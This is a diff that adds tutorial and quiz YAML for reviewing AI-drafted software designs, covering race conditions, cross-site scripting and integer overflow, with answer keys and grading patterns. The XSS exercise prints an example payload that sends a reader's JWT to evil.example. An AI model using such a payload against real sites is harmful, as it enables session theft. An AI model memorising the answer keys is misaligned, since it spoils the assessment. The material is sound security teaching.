+          participant db: RoomsDB #FFE0B2
+          participant mail: EmailService
+          ana -> api: POST /bookings (4C, Thu 7-9 pm)
+          activate api
+          api -> db: countBookings(room, slot)
+          activate db
+          db --> api: 0
+          deactivate db
+          note left of api
+            Each query commits on its
+            own, so no long transaction
+            blocks the midterm rush.
+          end note
+          alt [count == 0]
+            api -> db: insertBooking(room, slot, group)
+            activate db
+            db --> api: ok
+            deactivate db
+            api ->> mail: sendConfirmation(group)
+            api --> ana: 201 Booked
+          else [count > 0]
+            api --> ana: 409 Conflict: just taken
+          end
+          deactivate api
+          callout right of text "countBookings(room, slot)" : Ben's count can run here too, before Ana's insert, so both requests get 0.
+          callout right of text "insertBooking(room, slot, group)" : Nothing in RoomsDB refuses a second booking of the same slot.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant ana: Browser
+          participant api: BookingAPI
+          participant db: RoomsDB
+          participant mail: EmailService
+          ana -> api: POST /bookings (4C, Thu 7-9 pm)
+          activate api
+          api -> db: insertBooking(room, slot, group)
+          activate db
+          db --> api: ok, or duplicate slot
+          deactivate db
+          note left of api
+            UNIQUE (room, slot): RoomsDB
+            declines a second booking
+            of the same slot.
+          end note
+          alt [ok]
+            api ->> mail: sendConfirmation(group)
+            api --> ana: 201 Booked
+          else [duplicate slot]
+            api --> ana: 409 Conflict: just taken
+          end
+          deactivate api
+          @enduml
+    quiz:
+      title: "Step 5 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: intermediate
+          question: "An AI agent's UML sequence diagram for a web API shows a read that checks a condition, followed by a separate write that depends on the result. Which review question exposes the risk in this check-then-write design?"
+          options:
+            - "What if two users do this at the same moment?"
+            - "What if the server crashes between these two writes?"
+            - "Which rules are enforced only in the browser?"
+            - "Is this data still useful if it arrives late?"
+          correct_index: 0
+          option_feedback:
+            1: "A crash between two writes is an atomicity question. A check-then-write fails without any crash, when another request runs between the read and the write."
+            2: "Trust in the browser is a different risk. Here both requests reach the server, and the server's own check lets both through."
+            3: "Late data matters for streaming, where UDP can beat TCP. A booking that arrives late is still wanted; the trouble starts when two arrive together."
+          explanation: "A read followed by a dependent write leaves a gap. Asking what happens when two users act at once makes you replay both requests through that gap, which is how double bookings and lost updates are found."
+        - type: single
+          difficulty: advanced
+          question: |
+            An agent's UML sequence diagram for redeeming a one-time "free boba" code shows `CouponAPI` calling `isUsed(code)` and then, if the reply is `false`, `markUsed(code)`. Each call commits on its own. A student double-taps **Redeem**, so two requests arrive 3 ms apart. Which design change guarantees that the code is redeemed only once?
+          options:
+            - "Have one database statement mark it used only if it is still unused"
+            - "Disable the Redeem button in the app after the first tap"
+            - "Call `isUsed(code)` again right before calling `markUsed(code)`"
+            - "Wait 50 ms between the `isUsed` and the `markUsed` calls"
+          correct_index: 0
+          option_feedback:
+            1: "A disabled button stops the second tap, but not a second phone, a network retry, or a request sent by hand. Only the server sees every request."
+            2: "A second check narrows the gap without closing it: the other request can still run between the last check and the write."
+            3: "A delay moves the gap but keeps it; with the wrong timing, both requests still read `false`."
+          explanation: "The check and the write must become one step that the database performs for one request at a time, for example `UPDATE coupons SET used = true WHERE code = $1 AND used = false`, redeeming only if a row changed. The second request then changes nothing and is refused."
+        - type: multiple
+          difficulty: advanced
+          question: "A campus app runs its distributed database in two data centers. During a network partition between them, which features should choose consistency over availability, answering with an error rather than with possibly stale data? Select all that apply."
+          options:
+            - "Creating an account whose username must be unique"
+            - "Booking the last free slot of a study room"
+            - "Browsing the campus store's product catalog"
+            - "Showing how many likes a post has"
+          correct_indices: [0, 1]
+          option_feedback:
+            0: "Each side of the partition could accept the same username, which breaks the rule that usernames are unique. Refusing sign-ups until the partition heals keeps them unique."
+            1: "Each side could sell the last slot, which double-books the room. An error is better than a second confirmation for one slot."
+            2: "A catalog that is a few minutes out of date is harmless, so staying available serves shoppers better."
+            3: "A like count that lags slightly is still useful; an answer beats an error."
+          explanation: "The CAP theorem says that during a partition a distributed database must give up consistency or availability. Choose consistency where a stale read could break a rule, such as uniqueness, and availability where slightly stale data is still useful."
+        - type: single
+          difficulty: intermediate
+          question: |
+            An agent's UML sequence diagram for a course forum (Node.js and Express) shows login storing `lastUser := uid` in a module-level variable on the server. Later requests, such as `GET /my-posts`, carry no cookie or token. Ana logs in, then Ben logs in from his laptop, then Ana opens **My Posts**. What does Ana see, and why?
+          options:
+            - "Ben's posts: HTTP is stateless, and the server only knows the last login"
+            - "Her own posts: the server remembers which browser each login came from"
+            - "Her own posts: HTTPS keeps the two users' connections apart"
+            - "An error: Express rejects requests that carry no session cookie"
+          correct_index: 0
+          option_feedback:
+            1: "HTTP is stateless: a request carries only what the client sends, and this one names no user. The server cannot tell Ana's request from Ben's."
+            2: "HTTPS encrypts each connection, but the server code still reads one shared variable, which Ben's login overwrote."
+            3: "Express does not require sessions on its own. This design never checks for one, so the request is served as the last login."
+          explanation: "Every request must identify its user, for example with a session ID in an HttpOnly cookie or a signed token. A module-level variable holds one identity for the whole server, so the last login wins."
+
+  # ==========================================================================
+  # STEP 6: Rate My Dining Hall (cross-site scripting; zero trust)
+  # ==========================================================================
+  # Pedagogy: interleaved review with the default task. The learner follows
+  # one input across components, from Ben's request through storage into
+  # Ana's browser. L11 explains the flaw (slide 15, XSS; slide 17, the
+  # Twitter worm that failed to "sanitize or escape"; slide 18, zero trust),
+  # and the Fall 2025 final's question 14 asked which system is most prone to
+  # XSS (a review site). The agent's note that its editor "offers only" safe
+  # formatting is the trap: a request sent by hand never passes through it.
+  # Parameterized SQL is a real protection placed on the wrong path, which
+  # the knowledge check turns into a discrimination item (SQL injection
+  # versus XSS). It also reaches least privilege (L11 slides 35-36) and
+  # spaces step 4 (stdout and stderr).
+  - title: "Review 6: Rate My Dining Hall"
+    key: dining-reviews-xss
+    estimated_minutes: 12
+    instructions: |
+      ### Why this matters
+
+      A component diagram shows where data enters a system, where it is kept, and where it is shown again. Following one piece of data across every component it touches finds the problems that no single component owns.
+
+      ### 🎯 You will learn to
+
+      - Evaluate a component diagram by following one input from the request that brings it in to every screen that shows it.
+      - Distinguish a protection a design really has from one it only appears to have.
+
+      Play the Given as the student who sends it: which component would have to stop the request, and does the design make it do so?
+    design_review:
+      min_words: 35
+      request: |
+        "Build 'Rate My Dining Hall' for Bruin Plate, Epicuria, and De Neve. Reviews should support bold text and links to photos. Show me a component diagram before you write any code."
+      story: |
+        **As a** student, **I want** to write dining-hall reviews with bold text and links to photos, **so that** my reviews are fun to read.
+      acceptance_criteria:
+        - "**Given** a review with formatting, **when** anyone opens the dining hall's page, **then** they see the formatting."
+        - "**Given** any review, **when** another student reads it, **then** their account stays safe."
+      reply: |
+        Here is the component design:
+
+        - **`ReviewEditor`** (React) is a rich-text editor that offers only bold, italics, and links, so the HTML it sends is always safe.
+        - **`ReviewAPI`** (Express) stores each review's body exactly as sent, so the formatting survives.
+        - **`ReviewList`** renders each body with React's `dangerouslySetInnerHTML`, so bold text and links show up on the page.
+        - **`ReviewsDB`** is reached only through parameterized SQL, and `ReviewAPI` accepts at most 10 reviews per student per hour.
+        - **Login** uses UCLA single sign-on. The app keeps the resulting JWT in the browser's local storage (`localStorage.jwt`), so students stay logged in for a week.
+
+        Want me to scaffold the React components next?
+      given: |
+        Ben skips the editor and sends `POST /reviews` with `curl`. His review of Epicuria has this body (`x` is not an image, so the browser runs the `onerror` code):
+
+        ```html
+        <b>Best tacos!</b><img src="x" onerror="fetch('https://evil.example/?t=' + localStorage.jwt)">
+        ```
+
+        A minute later, Ana opens Epicuria's page. Trace Ben's review from his request to Ana's screen: what runs, where, and with whose rights?
+      diagrams:
+        - id: dining-reviews-components
+          type: component
+          label: "Review components (component diagram)"
+          source: |
+            @startuml
+            layout compact
+            component ReviewEditor <<React component>>
+            component ReviewList <<React component>>
+            component ReviewAPI <<Express router>> {
+              portin "POST /reviews" as api_post
+              portin "GET /reviews" as api_get
+            }
+            component ReviewsDB <<PostgreSQL>>
+            ReviewEditor --> api_post
+            ReviewList --> api_get
+            ReviewAPI --> ReviewsDB : parameterized SQL
+            note top of ReviewEditor
+              Offers only bold, italics,
+              and links, so its HTML is safe.
+            end note
+            note top of ReviewAPI
+              Stores the body as sent,
+              so formatting survives.
+            end note
+            note bottom of ReviewList
+              Renders each body with
+              dangerouslySetInnerHTML.
+            end note
+            @enduml
+      key:
+        flaw: "ReviewAPI stores each review's HTML exactly as sent and ReviewList renders it with dangerouslySetInnerHTML, so nothing sanitizes or escapes it. ReviewEditor's limits do not help, because a request sent by hand skips the editor. Any user's HTML, scripts included, runs in readers' browsers."
+        consequence: "When Ana opens Epicuria's page, ReviewList inserts Ben's HTML, the broken image fires onerror, and Ana's browser runs Ben's code as part of the page. It sends her JWT to evil.example, so Ben can act as Ana; every student who opens the page is hit."
+        fix: "Sanitize every review body against an allow-list (bold, italics, https links), for example with DOMPurify in ReviewAPI before storing it, so ReviewList only ever renders safe markup; or store Markdown or plain text and let React escape it."
+        accept_fixes:
+          - "escape the body on output instead of rendering it as HTML"
+          - "sanitize in ReviewList right before rendering, for example with DOMPurify"
+      signals:
+        flaw: ["sanitiz", "escap", "dangerously", "inner ?html", "raw html", "(stores?|saves?|keeps?) .{0,40}(html|as (is|sent|written))", "render.{0,40}html", "\\bxss\\b", "cross.?site", "script", "untrusted", "trust", "allow.?list", "whitelist", "(skip|bypass)\\w* .{0,30}editor", "curl", "by hand"]
+        consequence: ["onerror", "\\bruns?\\b", "execut", "\\bjwt\\b", "token", "local ?storage", "evil", "steal", "stole", "sends? (her|ana'?s|the)", "as ana", "impersonat", "(ana'?s|her) (account|session|login)", "every (reader|student|visitor|user)", "hijack"]
+        fix: ["sanitiz", "escap", "dompurify", "allow.?list", "whitelist", "markdown", "plain text", "\\bstrip", "textcontent", "(remove|drop|filter)\\w* .{0,30}(tags?|attributes?|script|onerror|html)", "encod"]
+      anchors:
+        - { label: "ReviewList", pattern: "review ?list" }
+        - { label: "dangerouslySetInnerHTML", pattern: "dangerously|inner ?html" }
+        - { label: "ReviewAPI", pattern: "review ?api" }
+        - { label: "ReviewEditor", pattern: "review ?editor" }
+        - { label: "POST /reviews", pattern: "post /reviews" }
+      coach:
+        flaw:
+          - "Follow Ben's review body from the request that carries it to Ana's screen. Which components touch it, and does any of them change it?"
+          - "Compare what ReviewEditor lets a student type with what POST /reviews accepts when Ben uses curl. Then look at how ReviewList puts the body on the page."
+          - "Complete: “ReviewAPI stores the body ___, and ReviewList renders it ___, so any ___ in a review ___ in the reader's browser.”"
+        consequence:
+          - "Read the Given's body again: when Ana's browser builds Epicuria's page, what does it do with that image?"
+          - "Whose browser runs the onerror code, on which site's page, and what can that code read there?"
+          - "Complete: “When Ana opens Epicuria's page, her browser runs ___, which sends ___ to ___, so Ben can ___.”"
+        fix:
+          - "Propose a change that keeps bold text and links working for honest reviews and that a request sent with curl cannot get around."
+          - "Which component does every review body pass through, whoever sends it? What should happen there to tags and attributes that are not bold, italics, or links?"
+          - "Name the component that cleans the body, what it keeps (an allow-list), what it drops, and what ReviewList then renders."
+      wrong_claims:
+        - patterns: ["sql injection", "prepared statement"]
+          note: "The queries are parameterized, so the database is safe from SQL injection. Ben's code never runs in the database: it runs in the browser of whoever reads the review."
+        - patterns: ["(check|validat|filter|restrict|limit|block)\\w* .{0,30}(in|inside) (the )?(review ?editor|editor|front.?end|browser|client)", "review ?editor (should|must|could) (check|validat|block|filter)"]
+          note: "Ben sent his review with curl, so ReviewEditor never saw it. A check that runs only on a user's device can be skipped; the server cannot rely on it."
+        - patterns: ["http.?only", "cookie"]
+          note: "An HttpOnly cookie keeps a script from reading the token, but Ben's code still runs in Ana's browser and can act as her. Stop review HTML from running at all."
+        - patterns: ["graphql", "rate.?limit", "too complex"]
+          note: "That choice does not decide what runs in a reader's browser. Follow the review's body from POST /reviews to ReviewList instead."
+      lesson:
+        principle: "Never Render Another User's Text as Code"
+        definition: |
+          **Cross-site scripting (XSS):** an attacker "injects JS code into a trusted site", and each victim's browser runs it with that site's rights. The code "can access cookies, session tokens, or other sensitive information retained by the browser and send it to the attacker." The 2010 Twitter worm spread because Twitter "failed to properly sanitize or escape" what users wrote. **Zero trust:** "any input might be malicious, so sanitize all inputs."
+        ask: |
+          **Ask:** where does another user's text become HTML in my browser?
+        flaw: |
+          `ReviewAPI` stores each body exactly as sent, and `ReviewList` renders it with `dangerouslySetInnerHTML`, so a review's HTML becomes part of every reader's page. The editor's limits protect nothing: Ben sent his review with `curl`. When Ana opens Epicuria's page, the broken image fires `onerror`, her browser runs Ben's code as if the site had written it, and her JWT goes to `evil.example`.
+        fix: |
+          Sanitize every body on the server against an allow-list, for example with DOMPurify in `ReviewAPI`: keep `b`, `i`, and links with `https` URLs, and drop every other tag and attribute, `onerror` included. `ReviewList` then renders only safe markup. Storing Markdown and letting React escape everything else works too. As defense in depth, keep the login token in an `HttpOnly` cookie, out of reach of scripts.
+        more: |
+          The design had real protections, parameterized SQL and a careful editor, so it *looked* safe. They guard the database and honest users; the attack takes the one path nobody guarded, from one student's text into another student's browser.
+      annotated:
+        label: "The flaw, annotated"
+        type: component
+        source: |
+          @startuml
+          layout compact
+          component ReviewEditor <<React component>>
+          component ReviewList <<React component>> #FFE0B2
+          component ReviewAPI <<Express router>> #FFE0B2 {
+            portin "POST /reviews" as api_post
+            portin "GET /reviews" as api_get
+          }
+          component ReviewsDB <<PostgreSQL>>
+          ReviewEditor --> api_post
+          ReviewList --> api_get
+          ReviewAPI --> ReviewsDB : parameterized SQL
+          note top of ReviewEditor
+            Offers only bold, italics,
+            and links, so its HTML is safe.
+          end note
+          note top of ReviewAPI
+            Stores the body as sent,
+            so formatting survives.
+          end note
+          note bottom of ReviewList
+            Renders each body with
+            dangerouslySetInnerHTML.
+          end note
+          callout bottom of element ReviewAPI : Nothing removes scripts here, and a request sent by hand never passes through ReviewEditor.
+          callout left of element ReviewList : A script in one student's review runs in every reader's browser.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: component
+        source: |
+          @startuml
+          layout compact
+          component ReviewEditor <<React component>>
+          component ReviewList <<React component>>
+          component ReviewAPI <<Express router>> {
+            portin "POST /reviews" as api_post
+            portin "GET /reviews" as api_get
+          }
+          component ReviewsDB <<PostgreSQL>>
+          ReviewEditor --> api_post
+          ReviewList --> api_get
+          ReviewAPI --> ReviewsDB : parameterized SQL
+          note top of ReviewEditor
+            Offers bold, italics,
+            and links.
+          end note
+          note top of ReviewAPI
+            Sanitizes every body (DOMPurify):
+            keeps b, i, and https links,
+            drops every other tag and attribute.
+          end note
+          note bottom of ReviewList
+            Renders only the
+            sanitized body.
+          end note
+          @enduml
+    quiz:
+      title: "Step 6 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: intermediate
+          question: "In a UML component diagram of a review site, `ReviewAPI` uses parameterized SQL for every query, and `ReviewList` renders review bodies with `dangerouslySetInnerHTML`. A teammate concludes that a review containing `<img src=x onerror=…>` cannot hurt anyone. What is wrong with that reasoning?"
+          options:
+            - "Parameterized SQL protects the database, but the review's HTML runs in readers' browsers"
+            - "Parameterized SQL protects SELECT queries only, not the INSERT that stores reviews"
+            - "Parameterized SQL only works if the queries also run inside a transaction"
+            - "Parameterized SQL must also be used inside ReviewList to cover the rendering"
+          correct_index: 0
+          option_feedback:
+            1: "Parameterized queries protect every statement, INSERT included: the stored body stays data and never becomes SQL. This attack does not target the database."
+            2: "Transactions decide which writes succeed together; they do not change how input is interpreted."
+            3: "ReviewList sends no SQL. It needs a different protection: showing the body as text or as sanitized markup, never as code."
+          explanation: "SQL injection and cross-site scripting are both injection attacks, but against different interpreters. Prepared statements keep input from becoming SQL in the database; sanitizing or escaping keeps input from becoming HTML and JavaScript in a reader's browser."
+        - type: single
+          difficulty: advanced
+          question: |
+            An agent's UML component diagram for a club events site shows an Express route that builds each event page as a string: `res.send('<h1>' + event.title + '</h1>')`. Any club officer can type a title, and titles are stored as written. Which change removes the cause of the cross-site scripting risk?
+          options:
+            - "Escape the title when building the page, so `<` and `>` show as text"
+            - "Store the title with a prepared statement instead of string concatenation"
+            - "Limit titles to 60 characters, too short for a useful script"
+            - "Have the server reject any title that contains `<script>`"
+          correct_index: 0
+          option_feedback:
+            1: "A prepared statement protects the database query. The title is stored safely, then pasted into the HTML page, which is where it becomes code."
+            2: "Short payloads exist: `<img src=x onerror=alert(1)>` is under 30 characters, and longer code can be loaded from elsewhere."
+            3: "A blocklist misses other ways to run code: `<img onerror=…>` needs no script tag at all."
+          explanation: "Escaping on output turns the title into text wherever it is shown, so no title can become markup or code. Templates that escape by default, such as React's JSX, do this automatically."
+        - type: single
+          difficulty: intermediate
+          question: "A review site's UML component diagram shows `ReviewAPI --> ReviewsDB`. `ReviewAPI` only adds and lists reviews. Following the principle of least privilege, which database rights should `ReviewAPI` run with?"
+          options:
+            - "Read and insert rights on the reviews table, and nothing else"
+            - "Owner rights on the whole database, so it can run migrations at startup"
+            - "Read and write rights on every table, so it never hits a permission error"
+            - "No rights at all, because parameterized SQL already blocks every attack"
+          correct_index: 0
+          option_feedback:
+            1: "Running migrations is a different job that needs different rights. With owner rights, an attacker who takes over ReviewAPI can drop every table."
+            2: "Broad rights avoid errors by widening the blast radius: a compromised ReviewAPI could read or change data it never needs."
+            3: "Parameterized SQL stops one attack. Least privilege limits the damage of the attacks nobody prevented, and ReviewAPI still needs rights to do its job."
+          explanation: "Least privilege: every program runs with the least set of privileges necessary to complete the job. ReviewAPI needs to read and add reviews, so a breach of ReviewAPI cannot delete tables or read unrelated data."
+        - type: single
+          difficulty: intermediate
+          question: |
+            A Python script runs in this shell pipeline: `python3 count_halls.py < reviews.csv | sort | uniq -c`. It prints one dining-hall name per review, and for each malformed row it also prints `WARN: bad row`. Where should the script print the warnings?
+          options:
+            - "To stderr, with `print(..., file=sys.stderr)`, so only data flows into `sort`"
+            - "To stdout, so the warnings stay next to the data they describe"
+            - "To stdout, and add `2>&1` to the pipeline so no warning is lost"
+            - "To stdout, prefixed with `#` so that `sort` and `uniq` skip them"
+          correct_index: 0
+          option_feedback:
+            1: "Next to the data is exactly the problem: `uniq -c` counts `WARN: bad row` like a dining hall, and enough bad rows put it at the top."
+            2: "`2>&1` sends stderr into the same pipe as stdout, which mixes the warnings back into the data."
+            3: "`sort` and `uniq` have no comment syntax; a line that starts with `#` is counted like any other."
+          explanation: "stdout carries a program's output to the next program; stderr carries messages for people. Writing warnings to stderr keeps the data stream clean, and `2> warnings.log` can still save them."
+
+  # ==========================================================================
+  # STEP 7: Rose Bowl mobile tickets (reuse: identify violated assumptions)
+  # ==========================================================================
+  # Pedagogy: interleaved review with the default task. The learner pushes
+  # the story's numbers through a reused class and finds an assumption that
+  # held in the old context only: the Ariane 5 lesson (L12 slides 23-25) on
+  # campus, where five bug-free years at a 600-seat theater are evidence for
+  # the theater alone. Two classes are reused and only one breaks, so the
+  # learner must discriminate rather than blame reuse as such. The knowledge
+  # check reaches L12's fixed dependency versions (urllib3) and trivial
+  # dependencies (left-pad), and spaces step 1 (information hiding).
+  - title: "Review 7: Rose Bowl Mobile Tickets"
+    key: rose-bowl-counter
+    estimated_minutes: 11
+    instructions: |
+      ### Why this matters
+
+      A Given scenario lets you test a design without running anything: take the story's numbers and push them through every class, attribute, and operation on the path. Where the trace gets stuck, you have found your review comment.
+
+      ### 🎯 You will learn to
+
+      - Evaluate a class diagram by pushing the Given scenario's numbers through each class and operation it reaches.
+      - Propose a fix that removes the cause, plus a check that would have caught the flaw before release.
+
+      Quote the numbers you use, from the story, the Given, and the diagram: a review with numbers is hard to argue with.
+    design_review:
+      min_words: 35
+      request: |
+        "Build mobile ticketing for UCLA football home games at the Rose Bowl. Reuse what you can from the Freud Playhouse box office. Show me a class diagram before you write any code."
+      story: |
+        **As a** Bruins fan, **I want** to buy a ticket for the home opener on my phone, **so that** I don't wait in line at the box office.
+      acceptance_criteria:
+        - "**Given** a seat is free, **when** I buy it, **then** I get a ticket with a QR code on my phone."
+        - "**Given** the Rose Bowl's roughly 89,000 seats, **when** fans buy tickets, **then** every seat can be sold online."
+      reply: |
+        Here is the class design:
+
+        - **Reused unchanged:** `SeatInventory` and `TicketCounter` from the Freud Playhouse box office. They have run for five years with no bug reports, so we skip rewriting and retesting them.
+        - **`TicketService.buy()`** reserves the seat, takes the next ticket number from `TicketCounter`, and returns a signed `QrTicket`.
+        - **QR codes are signed**, so an edited screenshot fails the scan at the gate.
+        - **`FanApp`** (React Native) runs on iPhone and Android and adds each ticket to the phone's wallet.
+
+        Want me to port the box-office module next?
+      given: |
+        Sales for the home opener open Monday at 9 am, and fans buy fast. At 9:40, ticket number 32,768 is being sold. Trace this sale through `TicketService.buy()`. What happens to this fan, and to the fans who buy after?
+      diagrams:
+        - id: rose-bowl-classes
+          type: class
+          label: "Ticketing classes (class diagram)"
+          source: |
+            @startuml
+            layout compact
+            class FanApp <<React Native>> {
+              + checkout(seat: SeatId)
+            }
+            class TicketService {
+              - seats: SeatInventory
+              - counter: TicketCounter
+              + buy(fan: FanId, seat: SeatId): QrTicket
+            }
+            class SeatInventory <<reused>> {
+              + reserve(seat): bool
+            }
+            class TicketCounter <<reused>> {
+              - sold: int16
+              + next(): int16
+            }
+            FanApp --> TicketService : buys with
+            TicketService --> SeatInventory : reserves seats
+            TicketService --> TicketCounter : numbers tickets
+            note bottom of SeatInventory
+              «reused»: unchanged from the
+              Freud Playhouse box office
+              (about 600 seats), 5 years
+              in production, no bug reports.
+            end note
+            @enduml
+      key:
+        flaw: "TicketCounter is reused unchanged from a 600-seat theater, where its 16-bit counter (sold and next() are int16, at most 32,767) was a safe assumption. The Rose Bowl has about 89,000 seats, so the assumption no longer holds, and the agent reused the class without checking or testing it at stadium scale."
+        consequence: "Ticket 32,768 does not fit in an int16 (max 32,767): next() overflows, so this sale fails (or gets a wrapped, negative number), and so does every sale after it. About 56,000 of the 89,000 seats cannot be sold correctly, breaking 'every seat can be sold online'."
+        fix: "Check the reused classes' assumptions against the stadium: widen sold and next() to a 32- or 64-bit integer, and test TicketCounter and SeatInventory with a full 89,000-seat sale before reusing them."
+        accept_fixes:
+          - "store the count in an INTEGER or BIGINT column with a matching counter type"
+          - "a new counter designed and tested for stadium sizes"
+      signals:
+        flaw: ["int ?16", "16.?bit", "smallint", "2.?byte", "two.?byte", "32,?76[78]", "65,?53[56]", "overflow", "too small", "max(imum)? (value|of|is)", "out of range", "range of", "assum", "context", "theat(er|re)", "playhouse", "\\b600\\b", "89,?000", "capacity"]
+        consequence: ["32,?76[78]", "overflow", "wrap", "negative", "out of range", "(sales?|purchases?|buying|checkout)\\w* .{0,30}(stop|fail|error|crash|halt|break)", "(stop|fail|error|crash|halt|break)\\w* .{0,40}(sale|sell|purchase|buy|ticket)", "56,?000", "unsold", "sell out", "every seat", "duplicate", "(can'?t|cannot) (be )?(sell|sold|buy|bought)"]
+        fix: ["int ?32", "int ?64", "32.?bit", "64.?bit", "bigint", "\\binteger\\b", "\\blong\\b", "\\bwide", "(larger|bigger) (type|integer|int|counter)", "\\btest", "assum", "check\\w* .{0,30}(reused|assumption|limit|documentation|context)"]
+      anchors:
+        - { label: "TicketCounter", pattern: "ticket ?counter" }
+        - { label: "sold: int16", pattern: "\\bsold\\b|int ?16" }
+        - { label: "next()", pattern: "next ?\\(" }
+        - { label: "the reused classes", pattern: "reused|playhouse|freud" }
+      coach:
+        flaw:
+          - "Which classes did the agent write for this project, and which came from somewhere else? Read the reused ones' attributes and return types as closely as the new ones."
+          - "What is the largest value TicketCounter.sold can hold, and how many tickets does one Rose Bowl game need?"
+          - "Complete: “TicketCounter was built for ___, where ___ was a safe assumption; at the Rose Bowl, ___.”"
+        consequence:
+          - "Follow the Given sale through TicketService.buy(): which operation produces the ticket number?"
+          - "What does next() have to return for ticket 32,768, and can its return type hold that? What do the fans after this one get?"
+          - "Complete: “For ticket 32,768, next() ___, so ___, and about ___ seats ___.”"
+        fix:
+          - "Make the fix hold for the stadium and for the next place this code is reused, not just for this game."
+          - "Which type holds 89,000 with room to spare? And which test, run before sales opened, would have shown the failure?"
+          - "Name the new type for sold and next(), and describe a test of the reused classes with stadium-sized data."
+      wrong_claims:
+        - patterns: ["(do not|don'?t|shouldn'?t|should not|never|avoid) reuse", "from scratch", "reuse is (bad|risky|the problem)"]
+          note: "Reuse is fine and often wise: these classes worked for five years. The question is whether what they assumed at the Playhouse still holds at the Rose Bowl."
+        - patterns: ["\\bpin", "pin\\w* (the )?versions?", "version (number|pinning)", "pipfile", "lock ?file"]
+          note: "Pinning keeps reused code from changing under you, but this code does not change: the same code now meets a stadium instead of a theater."
+        - patterns: ["qr.{0,40}(insecure|fake|forg|cop(y|ied)|screenshot|secur)", "(insecure|fake|forg|cop(y|ied)|screenshot).{0,40}qr"]
+          note: "The QR codes are signed, so an edited screenshot fails at the gate. Follow a ticket number instead: what happens as sales grow?"
+        - patterns: ["unsigned", "uint ?16"]
+          note: "An unsigned 16-bit counter stops at 65,535, still short of 89,000 seats. The new type has to fit the stadium with room to spare."
+      lesson:
+        principle: "Check a Reused Part's Assumptions in the New Context"
+        definition: |
+          Software that worked in one context might not work in another context. Ariane 5 reused Ariane 4's flight-control software, whose 16-bit horizontal velocity overflowed at Ariane 5's higher speeds. **Identify violated assumptions:** check documentation and code to identify the assumptions a reuse candidate makes, check that it was designed to operate reliably under the conditions you want, and don't assume its code is correct: test it.
+        ask: |
+          **Ask:** what did this part assume before, and is it still true here?
+        flaw: |
+          `TicketCounter` comes unchanged from the Freud Playhouse box office, where a 16-bit `sold` (at most 32,767) was safe for about 600 seats. The Rose Bowl has about 89,000. At ticket 32,768, `next()` overflows: the sale fails (or gets a wrapped, negative number), and so does every sale after it, with about 56,000 seats unsold. Five bug-free years only show that the assumption held at the Playhouse.
+        fix: |
+          List each reused class's assumptions and check them against the stadium. Widen `sold` and `next()` to a 64-bit integer (with a `BIGINT` column if the count is stored), and test `TicketCounter` and `SeatInventory` with a full 89,000-seat sale before tickets go on sale. `SeatInventory` passes the same check unchanged: reuse itself was never the problem.
+        more: |
+          The reuse note sounded reassuring: five years in production, no bugs. A track record is evidence only for the conditions under which it was earned.
+      annotated:
+        label: "The flaw, annotated"
+        type: class
+        source: |
+          @startuml
+          layout compact
+          class FanApp <<React Native>> {
+            + checkout(seat: SeatId)
+          }
+          class TicketService {
+            - seats: SeatInventory
+            - counter: TicketCounter
+            + buy(fan: FanId, seat: SeatId): QrTicket
+          }
+          class SeatInventory <<reused>> {
+            + reserve(seat): bool
+          }
+          class TicketCounter <<reused>> #FFE0B2 {
+            - sold: int16
+            + next(): int16
+          }
+          FanApp --> TicketService : buys with
+          TicketService --> SeatInventory : reserves seats
+          TicketService --> TicketCounter : numbers tickets
+          note bottom of SeatInventory
+            «reused»: unchanged from the
+            Freud Playhouse box office
+            (about 600 seats), 5 years
+            in production, no bug reports.
+          end note
+          callout right of text "sold: int16" : 16 bits hold at most 32,767 tickets: plenty for 600 seats, not for 89,000.
+          callout right of text "no bug reports." : Five quiet years only show that these classes work at Playhouse size.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: class
+        source: |
+          @startuml
+          layout compact
+          class FanApp <<React Native>> {
+            + checkout(seat: SeatId)
+          }
+          class TicketService {
+            - seats: SeatInventory
+            - counter: TicketCounter
+            + buy(fan: FanId, seat: SeatId): QrTicket
+          }
+          class SeatInventory <<reused>> {
+            + reserve(seat): bool
+          }
+          class TicketCounter <<reused>> {
+            - sold: int64
+            + next(): int64
+          }
+          FanApp --> TicketService : buys with
+          TicketService --> SeatInventory : reserves seats
+          TicketService --> TicketCounter : numbers tickets
+          note bottom of SeatInventory
+            «reused» after checking each
+            assumption against the stadium;
+            both tested with an 89,000-seat
+            sale before launch.
+          end note
+          @enduml
+    quiz:
+      title: "Step 7 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: intermediate
+          question: "Ariane 5 reused Ariane 4's flight-control software, which had worked perfectly. It stored horizontal velocity in a 16-bit integer, and Ariane 5 flew faster. Which rule for reusing a software module does this failure teach?"
+          options:
+            - "Check its assumptions against the new context, and test it there"
+            - "Only reuse modules that have never failed in production"
+            - "Pin the module's version so that updates cannot break it"
+            - "Rewrite reused modules in a newer, memory-safe language"
+          correct_index: 0
+          option_feedback:
+            1: "Ariane 4's software had never failed; its record was earned at lower speeds. A clean history says nothing about conditions the code never met."
+            2: "The code did not change at all. Pinning protects against changes, but here the same code met a new context."
+            3: "A memory-safe language still cannot fit the value into 16 bits; it fails or rejects it. The assumption about the range of values is the problem, not the language."
+          explanation: "Software that worked in one context might not work in another. Identify the assumptions a reuse candidate makes (here, the range of the velocity), check that it was designed for the conditions you need, and test it under those conditions."
+        - type: single
+          difficulty: advanced
+          question: |
+            An agent's UML class diagram for an online summer course reuses `DeadlineChecker` unchanged from an on-campus UCLA course, where it never failed. Its operation `+ isLate(submittedAt: LocalTime): bool` compares the submission's local clock time with "23:59". The summer course has students in Seoul and Berlin. Which review comment applies the rule for reuse?
+          options:
+            - "It assumes everyone is on Los Angeles time; check that and test abroad submissions"
+            - "It worked for years on campus, so it can be reused for this course as is"
+            - "Pin `DeadlineChecker`'s version so that no update can change its behavior"
+            - "Reused code should not cross courses; rewrite the class for this course"
+          correct_index: 0
+          option_feedback:
+            1: "Years without failures on campus were years in one time zone. The new course breaks the assumption that made them possible."
+            2: "Pinning stops the code from changing, but the unchanged code is already wrong for students in other time zones."
+            3: "Reuse is fine where the assumptions hold. Here one does not, and a useful review names it instead of banning reuse."
